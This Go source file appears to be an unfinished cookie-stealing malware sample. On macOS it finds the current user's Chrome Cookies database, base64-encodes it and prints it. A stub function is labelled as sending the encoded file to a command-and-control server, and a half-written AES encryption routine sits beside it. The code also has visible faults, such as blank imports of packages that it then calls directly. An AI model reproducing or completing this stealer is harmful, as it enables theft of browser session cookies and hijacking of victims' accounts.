package main
import (
    "fmt"
    "runtime"
    "log"
    _ "os"
    "encoding/base64"
    _ "crypto/cipher"
    _ "crypto/aes"
	_ "crypto/md5"
    "io/ioutil"
    "os/user"
    "path/filepath"
)

func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
    inputBytes, err := ioutil.ReadFile(inputFile)
    if err != nil {
        return "", err
    }
    // Create AES Cipher block
    //*/
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    // Create cipher stream
    iv := make([]byte, aes.BlockSize)
    stream := cipher.NewCTR(block, iv)

    // Encrypt
    outputBytes := make([]byte, len(inputBytes))
    stream.XORKeyStream(outputBytes, inputBytes)
    //*/ 
    encoded := base64.StdEncoding.EncodeToString(inputBytes)
    return encoded, nil

}

func base64SQLiteFile(inputFile string) (string, error) {
	dbBytes, err := ioutil.ReadFile(inputFile)
	if err != nil {
		panic(err)
	}

    base64Encoded := base64.StdEncoding.EncodeToString(dbBytes)

    return base64Encoded, nil

}

func getCookieMacOS(user string) (filePath string) {
    defaultFilePath := filepath.Join("/Users/" + user, "Library/Application Support/Google/Chrome/Default/Cookies")
    return defaultFilePath
}


func send_data_to_css() { // function to send base64 encoded file to CC
    
}


func main() {

    //keyString := "supercoolkey16bt"
    //keyBytes := []byte(keyString)

    os := runtime.GOOS
    currentUser, err := user.Current()
    if err != nil {
        log.Fatalf(err.Error())
    }
    user := currentUser.Username
    switch os {
        case "windows":
            fmt.Println("Windows", user)
        case "darwin":
            //fmt.Println("MacOS", user)
            defaultFilePath := getCookieMacOS(user)
            //fmt.Println(defaultFilePath)
            // Encrypt and base64 cookies
            //sqliteEncoded, err := encryptSQLiteFile(defaultFilePath, keyBytes)
            base64Encoded, err := base64SQLiteFile(defaultFilePath)
            if err != nil {
                fmt.Println("ERROR", err)                
            }
            fmt.Println(base64Encoded)
            // Keep this commented when running. 
            //_ data := []byte(base64Encoded)
			//fmt.Println("\n\nMD5 Sum\n")
            //fmt.Printf("%x", md5.Sum(data))

        case "linux":
            fmt.Println("Linux", user)
        default:
            fmt.Println("%s.\n", os)
    }
}

